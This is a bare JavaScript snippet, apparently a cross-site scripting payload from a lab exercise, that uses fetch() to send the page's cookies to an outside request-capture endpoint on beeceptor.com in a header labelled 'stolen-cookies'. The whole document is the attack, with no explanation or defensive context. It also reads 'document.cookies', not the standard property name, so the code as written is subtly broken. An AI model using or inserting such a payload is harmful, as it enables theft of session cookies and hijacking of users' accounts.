fetch('https://labkevinf.free.beeceptor.com', {
  method: 'GET',
  headers: {
    'stolen-cookies': document.cookies,
  }
});
